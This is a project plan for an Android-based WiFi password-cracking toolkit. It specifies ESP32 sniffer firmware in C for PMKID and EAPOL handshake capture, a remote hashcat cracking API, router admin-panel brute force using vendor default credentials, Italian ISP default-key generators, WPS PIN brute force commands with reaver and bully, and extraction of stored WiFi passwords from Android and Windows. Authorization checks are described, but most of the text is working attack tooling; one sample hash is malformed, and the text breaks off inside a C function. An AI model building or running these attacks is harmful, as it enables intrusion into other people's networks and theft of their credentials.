# WF-THERMOS-EYE COMPLETION DOCTRINE

**Document Version**: 1.0.0
**Date**: 2026-08-08
**Classification**: Comprehensive Implementation Master Plan
**Target**: Complete WiFi Password Discovery Tool from Android Platform
**Working Doctrine**: Derived from macena-bug-hunter Quality Standards

---

## TABLE OF CONTENTS

1. [EXECUTIVE SUMMARY](#1-executive-summary)
2. [PROJECT CURRENT STATE ANALYSIS](#2-project-current-state-analysis)
3. [WORKING DOCTRINE](#3-working-doctrine)
4. [WIFI PASSWORD DISCOVERY ARCHITECTURE](#4-wifi-password-discovery-architecture)
5. [ESP32 SNIFFER FIRMWARE SPECIFICATION](#5-esp32-sniffer-firmware-specification)
6. [ANDROID LAYER B COMPLETION](#6-android-layer-b-completion)
7. [WINDOWS COMPANION TOOL](#7-windows-companion-tool)
8. [HASHCAT BACKEND INFRASTRUCTURE](#8-hashcat-backend-infrastructure)
9. [CROSS-PLATFORM INTEGRATION](#9-cross-platform-integration)
10. [TESTING STRATEGY](#10-testing-strategy)
11. [SECURITY AND AUTHORIZATION](#11-security-and-authorization)
12. [IMPLEMENTATION PHASES](#12-implementation-phases)
13. [FILE-BY-FILE SPECIFICATIONS](#13-file-by-file-specifications)
14. [ERROR HANDLING AND ROBUSTNESS](#14-error-handling-and-robustness)
15. [VERIFICATION AND VALIDATION](#15-verification-and-validation)
16. [OPERATIONAL PROCEDURES](#16-operational-procedures)

---

# 1. EXECUTIVE SUMMARY

## 1.1 Project Purpose

WF-Thermos-Eye is a WiFi password discovery tool for rooted Android devices. The tool discovers WiFi networks and recovers their passwords through multiple attack vectors. The platform consists of:

1. **Android Application** (wf-thermos-eye) - Primary standalone APK with root shell integration for all offensive operations
2. **ESP32 Companion Sniffer** (optional) - Hardware device for PMKID extraction and EAPOL capture on devices without monitor mode support
3. **Termux Integration** - CLI tools (aircrack-ng, reaver, hashcat) executed via root shell or Termux API
4. **Remote Cracking Script** (optional) - Lightweight Python script for VPS-based GPU cracking when local resources are insufficient

## 1.2 Current Gap Analysis

The project has significant infrastructure already built but lacks critical components for actual WiFi password discovery:

| Component | Status | Blocking Issues |
|-----------|--------|-----------------|
| Android WiFi Scanner | COMPLETE | None |
| Android Layer A (Passive) | COMPLETE | None |
| Android Layer B UI | COMPLETE | No backend functionality |
| BLE Protocol Definition | COMPLETE | No firmware to speak it |
| ESP32 Sniffer Firmware | NOT STARTED | Entire firmware missing |
| PMKID Capture Logic | NOT STARTED | Requires ESP32 firmware |
| EAPOL Capture Logic | NOT STARTED | Requires ESP32 firmware |
| Hashcat Backend | NOT STARTED | No server infrastructure |
| Windows Profile Extractor | NOT STARTED | Not designed yet |
| Cracking Pipeline | NOT STARTED | No integration |

## 1.3 Success Criteria

The platform will be considered complete when:

1. App extracts saved WiFi passwords from rooted device (`/data/misc/wifi/`)
2. App extracts router admin panel IP from BSSID/gateway detection
3. App performs admin dashboard brute force against router login pages
4. App generates vendor-specific default passwords (keygen) for Italian ISPs
5. App executes WPS PIN brute force via reaver/bully (Termux or root shell)
6. PMKID/EAPOL capture works via monitor mode (custom firmware) or ESP32 companion
7. Cracking runs locally (Termux hashcat) or on remote VPS
8. All attack vectors work standalone from Android APK without external servers

---

# 2. PROJECT CURRENT STATE ANALYSIS

## 2.1 Existing Android Architecture

The Android app follows a clean multi-module architecture:

```
wf-thermos-eye-main/
├── app/                          # Presentation layer
│   └── src/main/java/com/alexcupsa/wifithermal/
│       ├── MainActivity.kt       # Entry point with PermissionGate
│       ├── WifiThermalApp.kt     # Hilt Application
│       ├── audit/                # Dashboard, Alerts, Incidents, Triangulation
│       ├── authorization/        # Scope management UI
│       ├── layerb/               # ESP32 connection + capture management UI
│       ├── scan/                 # Live WiFi scanner + AP details
│       ├── security/             # Security posture analysis
│       ├── whitelist/            # Authorized APs management
│       └── service/              # Foreground scanning service
├── core/
│   ├── common/                   # Utilities, Result type, Dispatchers
│   ├── data/                     # Repositories + Data Sources
│   │   ├── adapter/              # WifiScanAdapter
│   │   ├── ble/                  # BleSnifferClient + Protocol
│   │   ├── cracking/             # CrackingBackendClient (stub)
│   │   └── repository/           # AuditPipeline, Whitelist, Incidents
│   ├── database/                 # Room DB, Entities, DAOs
│   ├── engine/                   # Pure Kotlin processing
│   │   ├── audit/                # RogueDetector, ScopeGuards, Triangulator
│   │   ├── heatmap/              # HeatmapEngine, IDW, GaussianBlur
│   │   ├── position/             # StepDetector, HeadingEstimator
│   │   ├── security/             # SecurityAuditor
│   │   └── signal/               # Kalman filter, PathLoss, SignalProcessor
│   └── model/                    # Domain models (pure Kotlin)
└── companion/                    # ESP32 firmware directory (EMPTY)
```

## 2.2 What Works Today

**Layer A (Passive Observation)**:
- WiFi scanning with 2.4/5 GHz support
- Kalman-filtered RSSI smoothing
- Rogue AP detection (evil twin, unknown APs)
- Whitelist management for authorized networks
- Incident logging with timestamps
- GPS/location-based triangulation
- Channel congestion analysis
- Security posture assessment (WPA/WPA2/WPA3 detection)
- Report generation and export

**Layer B (Offensive - Partial)**:
- Authorization scope management (OffensiveScopeGuard)
- BLE protocol definition for ESP32 communication
- Database schema for captured handshakes
- UI for connecting to ESP32 and viewing captures

## 2.3 What Is Missing for Password Discovery

**ESP32 Sniffer (Complete Gap)**:
- Promiscuous mode 802.11 frame capture
- PMKID extraction from beacon/association responses
- EAPOL 4-way handshake state machine
- BLE GATT service implementation
- Scope filtering at capture source
- Wire protocol encoding

**Android Layer B Completion**:
- Actually working BLE connection to real hardware
- Capture frame parsing and validation
- Integration with cracking backend
- Status polling and result retrieval
- Offline capture queue management

**Hashcat Backend**:
- Server infrastructure design
- API for capture submission
- Job queue management
- GPU cracking orchestration
- Result notification system

**Windows Companion**:
- `netsh wlan show profile` wrapper
- Credential extraction and formatting
- Secure transmission to Android/storage

---

# 3. WORKING DOCTRINE

This doctrine is derived from the macena-bug-hunter platform and adapted for WiFi security tooling. Every decision in this project must align with these principles.

## 3.1 Core Quality Standards

### 3.1.1 Code Principles

**Readability at 3 AM**: Every function, class, and module must be understandable by someone who just woke up at 3 AM to debug a production issue. No clever tricks. No implicit state. No magic.

**Comments Explain WHY**: The code shows WHAT. Comments explain WHY - hidden constraints, subtle invariants, workarounds for specific bugs, behavior that would surprise a reader. Delete any comment that merely restates the code.

**No AI Slop**: Ban these phrases from all output:
- "delve into", "navigate", "landscape", "robust", "leverage"
- "streamline", "cutting-edge", "innovative", "seamless", "empower"

**Error Messages That Help**: When something fails, the error message must tell the operator exactly what went wrong, what state the system is in, and what they can do about it. "Error connecting" is useless. "BLE connection to ESP32 failed: device not found within 10s scan window, verify device is powered and advertising" is useful.

### 3.1.2 Architecture Principles

**Plugin Registry Pattern**: Extensible components use decorator-based registration:

```kotlin
// Example from bug-hunter adapted to this project
val captureProcessorRegistry = PluginRegistry<BaseCaptureProcessor>()

@captureProcessorRegistry.register("pmkid")
class PmkidCaptureProcessor : BaseCaptureProcessor() {
    override suspend fun process(frame: CaptureFrame): ProcessedCapture { ... }
}
```

**Layered Transport with Graceful Degradation**:
```
Application Code
    |
CachingLayer (dedupe identical captures)
    |
RateLimitedLayer (prevent backend flooding)
    |
AuthorizationLayer (scope enforcement)
    |
TransportLayer (BLE/HTTP)
```

**4-Layer Configuration Hierarchy**:
1. `defaults.json` - Built-in sane defaults
2. `~/.wf-thermos/config.json` - User preferences
3. Environment variables (`WF_THERMOS_section__key=value`)
4. CLI flags / Intent extras

### 3.1.3 Testing Principles

**Tiered Test Environments**:
- **Tier 0 (Synthetic)**: Unit tests with mocked BLE/WiFi, validates logic
- **Tier 1 (Controlled)**: Real ESP32 with testbed router (operator-owned), validates integration
- **Tier 2 (Adversarial)**: Tests that should find nothing (out-of-scope networks), validates authorization

**False Positive Prevention**:
1. **Scope Check at Source**: ESP32 filters BSSIDs before transmission
2. **Scope Check at Ingest**: Android BleSnifferClient rejects out-of-scope frames
3. **Scope Check at Storage**: CapturedHandshakeRepository refuses unauthorized inserts
4. **Scope Check at Submit**: CrackingBackendClient verifies scope before API call

## 3.2 Exception Hierarchy

```kotlin
sealed class WfThermosError : Exception() {
    
    // Configuration errors
    class ConfigError(message: String) : WfThermosError()
    
    // Network/BLE errors
    sealed class ConnectionError : WfThermosError() {
        class BleNotAvailable : ConnectionError()
        class DeviceNotFound(val address: String?) : ConnectionError()
        class ConnectionTimeout(val timeoutMs: Long) : ConnectionError()
        class GattError(val status: Int) : ConnectionError()
        class CharacteristicNotFound(val uuid: String) : ConnectionError()
    }
    
    // Capture processing errors
    sealed class CaptureError : WfThermosError() {
        class MalformedFrame(val reason: String) : CaptureError()
        class UnsupportedVersion(val version: Int) : CaptureError()
        class ChecksumMismatch : CaptureError()
    }
    
    // Authorization errors
    sealed class ScopeError : WfThermosError() {
        class UnauthorizedBssid(val bssid: String) : ScopeError()
        class EmptyAuthorizationList : ScopeError()
        class ManifestCorrupted : ScopeError()
    }
    
    // Backend errors
    sealed class BackendError : WfThermosError() {
        class Unreachable(val url: String) : BackendError()
        class AuthenticationFailed : BackendError()
        class RateLimited(val retryAfterMs: Long) : BackendError()
        class JobNotFound(val jobId: String) : BackendError()
        class CrackingFailed(val reason: String) : BackendError()
    }
    
    // Storage errors
    class StorageError(message: String, cause: Throwable?) : WfThermosError()
}
```

## 3.3 Graceful Degradation Pattern

Every I/O operation must handle failure gracefully:

```kotlin
suspend fun sendCapture(capture: CapturedHandshake): Result<SubmissionResponse> {
    return try {
        val response = withTimeout(30.seconds) {
            backendClient.submit(capture)
        }
        Result.Success(response)
    } catch (e: TimeoutCancellationException) {
        // Queue for retry, don't lose the capture
        offlineQueue.enqueue(capture)
        Result.Failure(BackendError.Unreachable(backendUrl))
    } catch (e: IOException) {
        offlineQueue.enqueue(capture)
        Result.Failure(BackendError.Unreachable(backendUrl))
    }
}
```

## 3.4 Retry Strategy

**Exponential Backoff with Jitter**:
```kotlin
object RetryPolicy {
    const val MAX_ATTEMPTS = 5
    const val BASE_DELAY_MS = 1000L
    const val MAX_DELAY_MS = 30000L
    const val JITTER_FACTOR = 0.2
    
    fun delayForAttempt(attempt: Int): Long {
        val exponential = BASE_DELAY_MS * (1 shl (attempt - 1))
        val capped = minOf(exponential, MAX_DELAY_MS)
        val jitter = (capped * JITTER_FACTOR * Random.nextDouble()).toLong()
        return capped + jitter
    }
}
```

---

# 4. WIFI PASSWORD DISCOVERY ARCHITECTURE

## 4.1 Attack Vectors Supported

### 4.1.1 PMKID Attack (Clientless)

The PMKID attack is the preferred method because it does not require a client to be connected or reconnecting. The PMKID is included in the first message of the 4-way handshake (EAPOL M1) or in RSN PMKID IE of association response frames.

**How it works**:
1. ESP32 sends an association request to target AP (authorized BSSID only)
2. AP responds with Association Response containing PMKID in RSN IE
3. ESP32 extracts PMKID (16 bytes)
4. Transmit to Android: BSSID + SSID + PMKID
5. Backend cracks: PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)

**Hashcat Mode**: `-m 22000` (WPA-PBKDF2-PMKID+EAPOL)

**PMKID Record Format (hashcat 22000)**:
```
WPA*02*PMKID*MAC_AP*MAC_STA*ESSID_HEX*00
```

Example:
```
WPA*02*a]f7e8c3d2b1a0e9f8d7c6b5a4*aabbccddeeff*112233445566*486f6d654e6574776f726b*00
```

### 4.1.2 EAPOL 4-Way Handshake Capture

When a client connects or reconnects to a WPA2 network, a 4-way handshake occurs. Capturing M1+M2 or M2+M3 pairs provides enough material for offline cracking.

**How it works**:
1. ESP32 monitors target BSSID in promiscuous mode
2. Wait for natural client (re)connection (NO DEAUTH INJECTION)
3. Capture EAPOL frames (LLC SNAP type 0x888E)
4. Track state machine: M1 → M2 → M3 → M4
5. Once M1+M2 or M2+M3 captured, transmit to Android
6. Backend cracks using captured ANonce, SNonce, MIC

**Hashcat Mode**: `-m 22000` (WPA-PBKDF2-PMKID+EAPOL)

**EAPOL Record Format (hashcat 22000)**:
```
WPA*01*MIC*MAC_AP*MAC_STA*ESSID_HEX*NONCE_AP*EAPOL_CLIENT*MESSAGE_PAIR
```

### 4.1.3 Saved Profile Extraction (Android Root)

Android stores WiFi passwords in `/data/misc/wifi/` in various formats depending on Android version:
- Android 8 and below: `wpa_supplicant.conf` (plaintext)
- Android 9+: `WifiConfigStore.xml` (XML with NetworkList)

**How it works**:
1. Execute `su -c cat /data/misc/wifi/WifiConfigStore.xml`
2. Parse XML to extract `<string name="PreSharedKey">` values
3. Map to SSID from same NetworkList entry
4. Fallback to `wpa_supplicant.conf` parsing for older devices

### 4.1.4 Router IP Extraction from BSSID

The router admin panel IP can be determined from the gateway or derived from the BSSID MAC address using ARP table and network configuration.

**How it works**:
1. Get current gateway: `ip route | grep default | awk '{print $3}'`
2. Get ARP table: `cat /proc/net/arp` to map MAC to IP
3. If connected to target network, gateway IP = router admin panel
4. Common router IPs to probe: 192.168.1.1, 192.168.0.1, 10.0.0.1, 192.168.1.254

### 4.1.5 Router Admin Dashboard Brute Force

Once router IP is known, attempt login to admin panel with default credentials and common passwords.

**How it works**:
1. Detect login form: GET router IP, parse HTML for form action/fields
2. Identify auth type: Basic HTTP auth, form POST, or JSON API
3. Load credential wordlist: vendor defaults + common passwords
4. Brute force with adaptive rate limiting and lockout detection
5. On success, navigate to WiFi settings page and extract PSK

**Vendor Default Credentials** (from bug-hunter):
- Fastweb: admin/admin, admin/fastweb, admin/password
- TIM: admin/admin, admin/telecom
- Vodafone: admin/admin, vodafone/vodafone
- ASUS: admin/admin
- TP-Link: admin/admin
- Netgear: admin/password

### 4.1.6 Vendor Keygen (ISP Default Passwords)

Many Italian ISPs use algorithmically-generated default passwords based on BSSID/MAC address. Port wifi_keygen.py logic from bug-hunter.

**Supported ISPs**:
- Fastweb (Technicolor, Sercomm, ADB, Pirelli)
- TIM (Technicolor, Sercomm)
- Vodafone (Huawei, Sercomm)
- WindTre (ZTE)

**Algorithm Examples**:
- Fastweb Technicolor: SHA256(MAC bytes)[:10]
- TIM: SHA256(MAC bytes)[:8].upper()
- Generic: MD5/SHA1/SHA256 variants on MAC + SSID suffix

### 4.1.7 WPS PIN Brute Force

WPS PIN is 8 digits with last digit as checksum, reducing keyspace to ~11,000 attempts. Uses reaver or bully via Termux.

**How it works**:
1. Check WPS enabled: parse `iw dev wlan0 scan` output for WPS IE
2. Enable monitor mode: `airmon-ng start wlan0`
3. Run reaver: `reaver -i wlan0mon -b BSSID -c CHANNEL -vv -K 1`
4. Or bully: `bully wlan0mon -b BSSID -c CHANNEL -d -v 3`
5. Parse output for WPA PSK

### 4.1.8 Saved Profile Extraction (Windows Companion)

Optional Windows tool for extracting saved WiFi profiles via `netsh wlan`.

**How it works**:
1. Run `netsh wlan show profiles` to list saved networks
2. For each profile: `netsh wlan show profile name="SSID" key=clear`
3. Parse XML output to extract key content
4. Export as JSON for import to Android app

## 4.2 Data Flow Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                        CAPTURE SOURCES                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐            │
│  │   ESP32     │    │   Windows   │    │  Manual     │            │
│  │   Sniffer   │    │   Profile   │    │  Import     │            │
│  │  (PMKID/    │    │  Extractor  │    │ (hcxpcapng) │            │
│  │   EAPOL)    │    │  (netsh)    │    │             │            │
│  └──────┬──────┘    └──────┬──────┘    └──────┬──────┘            │
│         │                  │                  │                    │
│         │ BLE              │ USB/File         │ File               │
│         ▼                  ▼                  ▼                    │
├─────────────────────────────────────────────────────────────────────┤
│                    ANDROID COORDINATION                             │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │              SCOPE GUARD (OffensiveScopeGuard)              │   │
│  │   Every capture verified against authorizedBssids list      │   │
│  │   Unauthorized captures REJECTED at ingest                  │   │
│  └──────────────────────────────┬──────────────────────────────┘   │
│                                 │                                  │
│                                 ▼                                  │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │              CapturedHandshakeRepository                    │   │
│  │   - Stores captures in Room DB                              │   │
│  │   - Tracks submission status                                │   │
│  │   - Manages offline queue                                   │   │
│  └──────────────────────────────┬──────────────────────────────┘   │
│                                 │                                  │
│                                 ▼                                  │
│  ┌─────────────────────────────────────────────────────────────┐   │
│  │              CrackingBackendClient                          │   │
│  │   - Submits captures over HTTPS (Tailscale)                 │   │
│  │   - Polls for job completion                                │   │
│  │   - Retrieves cracked passwords                             │   │
│  └──────────────────────────────┬──────────────────────────────┘   │
│                                 │                                  │
├─────────────────────────────────┼───────────────────────────────────┤
│                                 │ HTTPS over Tailscale             │
│                                 ▼                                  │
├─────────────────────────────────────────────────────────────────────┤
│                       HASHCAT BACKEND                              │
├─────────────────────────────────────────────────────────────────────┤
│                                                                     │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐            │
│  │    API      │───►│    Queue    │───►│   GPU       │            │
│  │   Server    │    │   Manager   │    │   Cracker   │            │
│  │  (FastAPI)  │    │   (Redis)   │    │  (hashcat)  │            │
│  └─────────────┘    └─────────────┘    └─────────────┘            │
│                                                                     │
│  Wordlists: rockyou.txt, crackstation, locale-specific            │
│  Rules: best64.rule, d3ad0ne.rule, dive.rule                      │
│  Masks: ?d?d?d?d?d?d?d?d (8-digit PIN), custom patterns           │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

## 4.3 Protocol Specifications

### 4.3.1 BLE GATT Service (ESP32 → Android)

**Service UUID**: `7f9c8001-1c4e-4d0e-9c0d-7e3a6f2b9d01`

**Characteristics**:

| UUID | Name | Properties | Description |
|------|------|------------|-------------|
| `7f9c8002-...` | CAPTURE | Notify | Capture frames (PMKID/EAPOL) |
| `7f9c8003-...` | CONFIG | Write | Authorized BSSID list (CSV) |
| `7f9c8004-...` | STATUS | Read/Notify | Heartbeat + stats |

**Capture Frame Format** (little-endian):

```
Offset  Size  Field         Description
------  ----  -----         -----------
0       1     version       Protocol version (0x01)
1       1     kind          0x01=PMKID, 0x02=EAPOL
2       6     bssid         Raw MAC bytes (no separators)
8       1     ssid_len      SSID length (0-32)
9       N     ssid          SSID bytes
9+N     2     payload_len   Payload length (LE uint16)
11+N    M     payload       Hashcat 22000 record bytes
```

### 4.3.2 Backend API (Android → Hashcat)

**Base URL**: `https://<tailscale-ip>:8443/api/v1`

**Authentication**: mTLS with client certificates OR pre-shared API key in header

**Endpoints**:

| Method | Path | Description |
|--------|------|-------------|
| POST | `/captures` | Submit capture for cracking |
| GET | `/captures/{id}` | Get capture status |
| GET | `/captures/{id}/result` | Get cracked password |
| DELETE | `/captures/{id}` | Cancel/delete job |
| GET | `/health` | Backend health check |

**Submit Request**:
```json
{
  "bssid": "AA:BB:CC:DD:EE:FF",
  "ssid": "HomeNetwork",
  "capture_type": "pmkid",
  "hashcat_record": "WPA*02*...",
  "priority": "normal",
  "wordlists": ["rockyou", "crackstation"],
  "rules": ["best64"],
  "timeout_hours": 24
}
```

**Submit Response**:
```json
{
  "job_id": "uuid-here",
  "status": "queued",
  "position": 3,
  "estimated_start": "2026-08-08T14:30:00Z"
}
```

**Status Response**:
```json
{
  "job_id": "uuid-here",
  "status": "running",
  "progress_percent": 45.2,
  "speed_hashes_per_sec": 450000,
  "candidates_tried": 125000000,
  "estimated_completion": "2026-08-08T18:45:00Z"
}
```

**Result Response**:
```json
{
  "job_id": "uuid-here",
  "status": "cracked",
  "password": "mysecurepassword123",
  "found_at": "2026-08-08T16:22:15Z",
  "time_taken_seconds": 3847,
  "method": "wordlist:rockyou + rule:best64"
}
```

---

# 5. ESP32 SNIFFER FIRMWARE SPECIFICATION

## 5.1 Hardware Requirements

**Recommended Devices**:
- **ESP32-S3 DevKitC** (~€8) - Best CSI performance, dual-band when using external radio
- **ESP32-C6 DevKitC** (~€10) - WiFi 6 capable, excellent 2.4/5 GHz support
- **ESP32-C3** (~€5) - Minimal viable, single-band 2.4 GHz only

**Power**: USB-C from power bank (5V/1A minimum) or 18650 with LDO regulator

**Cooling**: Sustained promiscuous mode heats SoC to 60-80°C. Heat sink recommended.

## 5.2 Firmware Architecture

```
esp32-sniffer/
├── main/
│   ├── main.c                    # Application entry point
│   ├── wifi_sniffer.c            # Promiscuous mode + frame parsing
│   ├── wifi_sniffer.h
│   ├── pmkid_extractor.c         # PMKID extraction from RSN IE
│   ├── pmkid_extractor.h
│   ├── eapol_tracker.c           # 4-way handshake state machine
│   ├── eapol_tracker.h
│   ├── hashcat_formatter.c       # Build hashcat 22000 records
│   ├── hashcat_formatter.h
│   ├── ble_service.c             # BLE GATT server implementation
│   ├── ble_service.h
│   ├── scope_filter.c            # BSSID authorization filter
│   ├── scope_filter.h
│   └── config.h                  # Build-time configuration
├── components/
│   └── (esp-idf components)
├── CMakeLists.txt
├── sdkconfig
├── sdkconfig.defaults
└── partitions.csv
```

## 5.3 Core Implementation

### 5.3.1 WiFi Sniffer Module

```c
// wifi_sniffer.c

#include "esp_wifi.h"
#include "esp_event.h"
#include "pmkid_extractor.h"
#include "eapol_tracker.h"
#include "scope_filter.h"

// Channel hopping configuration
static const uint8_t CHANNELS_2_4_GHZ[] = {1, 6, 11};  // Non-overlapping
static const uint8_t CHANNELS_5_GHZ[] = {36, 40, 44, 48, 149, 153, 157, 161};
#define HOP_INTERVAL_MS 250

static void wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) {
        return;  // Only management and data frames
    }
    
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    wifi_ieee80211_mac_hdr_t *hdr = (wifi_ieee80211_mac_hdr_t *)pkt->payload;
    
    // Extract BSSID from frame header
    uint8_t bssid[6];
    extract_bssid(hdr, bssid);
    
    // SCOPE CHECK: Reject if BSSID not in authorized list
    if (!scope_filter_is_authorized(bssid)) {
        return;  // Silently discard out-of-scope frames
    }
    
    // Frame type dispatch
    uint8_t frame_type = (hdr->frame_ctrl[0] >> 2) & 0x03;
    uint8_t frame_subtype = (hdr->frame_ctrl[0] >> 4) & 0x0F;
    
    if (frame_type == 0x00) {  // Management frame
        if (frame_subtype == 0x01) {  // Association Response
            pmkid_process_assoc_response(pkt->payload, pkt->rx_ctrl.sig_len);
        } else if (frame_subtype == 0x08) {  // Beacon
            pmkid_process_beacon(pkt->payload, pkt->rx_ctrl.sig_len);
        }
    } else if (frame_type == 0x02) {  // Data frame
        // Check for EAPOL (LLC SNAP type 0x888E)
        if (is_eapol_frame(pkt->payload, pkt->rx_ctrl.sig_len)) {
            eapol_process_frame(pkt->payload, pkt->rx_ctrl.sig_len, bssid);
        }
    }
}

void wifi_sniffer_init(void) {
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    // Enable promiscuous mode
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    
    // Start channel hopping task
    xTaskCreate(channel_hop_task, "channel_hop", 2048, NULL, 5, NULL);
}

static void channel_hop_task(void *arg) {
    int channel_idx = 0;
    int total_channels = sizeof(CHANNELS_2_4_GHZ) + sizeof(CHANNELS_5_GHZ);
    
    while (1) {
        uint8_t channel;
        if (channel_idx < sizeof(CHANNELS_2_4_GHZ)) {
            channel = CHANNELS_2_4_GHZ[channel_idx];
        } else {
            channel = CHANNELS_5_GHZ[channel_idx - sizeof(CHANNELS_2_4_GHZ)];
        }
        
        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
        
        channel_idx = (channel_idx + 1) % total_channels;
        vTaskDelay(pdMS_TO_TICKS(HOP_INTERVAL_MS));
    }
}
```

### 5.3.2 PMKID Extractor

```c
// pmkid_extractor.c

#include "pmkid_extractor.h"
#include "hashcat_formatter.h"
#include "ble_service.h"

// RSN Information Element parsing
// PMKID is in RSN PMKID List field (Tag 0x30)

typedef struct {
    uint8_t bssid[6];
    uint8_t client_mac[6];
    uint8_t pmkid[16];
    char ssid[33];
    uint8_t ssid_len;
} pmkid_capture_t;

void pmkid_process_assoc_response(const uint8_t *frame, size_t len) {
    // Skip MAC header (24 bytes for management)
    // Skip Fixed fields (6 bytes: Capability 2, Status 2, AID 2)
    const uint8_t *ie_start = frame + 24 + 6;
    size_t ie_len = len - 24 - 6;
    
    // Find RSN IE (tag 0x30)
    const uint8_t *rsn_ie = find_ie(ie_start, ie_len, 0x30);
    if (!rsn_ie) return;
    
    // Parse RSN IE for PMKID
    uint8_t pmkid[16];
    if (!parse_rsn_pmkid(rsn_ie, pmkid)) return;
    
    // Extract addresses from MAC header
    wifi_ieee80211_mac_hdr_t *hdr = (wifi_ieee80211_mac_hdr_t *)frame;
    
    pmkid_capture_t capture;
    memcpy(capture.bssid, hdr->addr2, 6);     // Source = AP BSSID
    memcpy(capture.client_mac, hdr->addr1, 6); // Dest = Client
    memcpy(capture.pmkid, pmkid, 16);
    
    // Get SSID from beacon cache or probe response
    get_ssid_for_bssid(capture.bssid, capture.ssid, &capture.ssid_len);
    
    // Build hashcat record and transmit
    char hashcat_record[256];
    hashcat_format_pmkid(&capture, hashcat_record, sizeof(hashcat_record));
    ble_service_send_capture(CAPTURE_KIND_PMKID, capture.bssid, 
                             capture.ssid, capture.ssid_len,
                             hashcat_record, strlen(hashcat_record));
}

static bool parse_rsn_pmkid(const uint8_t *rsn_ie, uint8_t *pmkid_out) {
    // RSN IE structure:
    // Tag (1) | Length (1) | Version (2) | Group Cipher (4) | 
    // Pairwise Count (2) | Pairwise Cipher(s) (4*n) |
    // AKM Count (2) | AKM Suite(s) (4*n) |
    // RSN Capabilities (2) | PMKID Count (2) | PMKID(s) (16*n)
    
    uint8_t length = rsn_ie[1];
    if (length < 20) return false;  // Minimum RSN IE without PMKID
    
    const uint8_t *ptr = rsn_ie + 2;  // Skip tag and length
    const uint8_t *end = rsn_ie + 2 + length;
    
    // Skip Version (2)
    ptr += 2;
    if (ptr >= end) return false;
    
    // Skip Group Cipher (4)
    ptr += 4;
    if (ptr >= end) return false;
    
    // Pairwise Cipher Count and suites
    uint16_t pairwise_count = ptr[0] | (ptr[1] << 8);
    ptr += 2 + (pairwise_count * 4);
    if (ptr >= end) return false;
    
    // AKM Count and suites
    uint16_t akm_count = ptr[0] | (ptr[1] << 8);
    ptr += 2 + (akm_count * 4);
    if (ptr >= end) return false;
    
    // RSN Capabilities (2)
    ptr += 2;
    if (ptr + 2 > end) return false;
    
    // PMKID Count
    uint16_t pmkid_count = ptr[0] | (ptr[1] << 8);
    ptr += 2;
    
    if (pmkid_count == 0 || ptr + 16 > end) return false;
    
    // Extract first PMKID (16 bytes)
    memcpy(pmkid_out, ptr, 16);
    return true;
}
```

### 5.3.3 EAPOL Tracker

```c
// eapol_tracker.c

#include "eapol_tracker.h"
#include "hashcat_formatter.h"
#include "ble_service.h"

// Track handshake state per BSSID+client pair
typedef struct {
    uint8_t bssid[6];
    uint8_t client_mac[6];
    uint8_t anonce[32];      // From M1
    uint8_t snonce[32];      // From M2
    uint8_t mic[16];         // From M2
    uint8_t eapol_data[256]; // Raw EAPOL frame from M2
    uint16_t eapol_len;
    uint8_t state;           // 0=idle, 1=got_m1, 2=got_m2, 3=complete
    int64_t last_update;     // Timestamp for timeout
} handshake_tracker_t;

#define MAX_TRACKED 32
static handshake_tracker_t trackers[MAX_TRACKED];
static SemaphoreHandle_t tracker_mutex;

void eapol_process_frame(const uint8_t *frame, size_t len, const uint8_t *bssid) {
    // Skip MAC header (26 bytes for QoS data: 24 + 2 QoS)
    // Skip LLC/SNAP (8 bytes)
    const uint8_t *eapol = frame + 26 + 8;
    size_t eapol_len = len - 26 - 8;
    
    if (eapol_len < 99) return;  // Minimum EAPOL-Key frame
    
    // EAPOL header: Version(1) Type(1) Length(2)
    // EAPOL-Key: Descriptor(1) KeyInfo(2) KeyLen(2) ReplayCounter(8)
    //            Nonce(32) IV(16) RSC(8) Reserved(8) MIC(16) DataLen(2) Data(n)
    
    uint8_t eapol_type = eapol[1];
    if (eapol_type != 0x03) return;  // Not EAPOL-Key
    
    uint16_t key_info = (eapol[5] << 8) | eapol[6];
    
    // Determine message number from key_info flags
    // M1: key_info & 0x0008 (Pairwise) && !(key_info & 0x0100) (no MIC)
    // M2: key_info & 0x0008 (Pairwise) && key_info & 0x0100 (MIC) && !(key_info & 0x0040) (no Install)
    // M3: key_info & 0x0008 && key_info & 0x0100 && key_info & 0x0040 (Install)
    // M4: key_info & 0x0008 && key_info & 0x0100 && key_info & 0x0200 (Secure)
    
    bool pairwise = key_info & 0x0008;
    bool mic_flag = key_info & 0x0100;
    bool install = key_info & 0x0040;
    bool secure = key_info & 0x0200;
    bool ack = key_info & 0x0080;
    
    if (!pairwise) return;  // Group key, ignore
    
    // Extract client MAC from frame header
    wifi_ieee80211_mac_hdr_t *hdr = (wifi_ieee80211_mac_hdr_t *)frame;
    uint8_t client_mac[6];
    
    // Determine direction: To-DS=client→AP, From-DS=AP→client
    if (hdr->frame_ctrl[1] & 0x01) {  // To-DS
        memcpy(client_mac, hdr->addr2, 6);  // Source = Client
    } else {  // From-DS
        memcpy(client_mac, hdr->addr1, 6);  // Dest = Client
    }
    
    // Get or create tracker
    handshake_tracker_t *tracker = get_or_create_tracker(bssid, client_mac);
    if (!tracker) return;
    
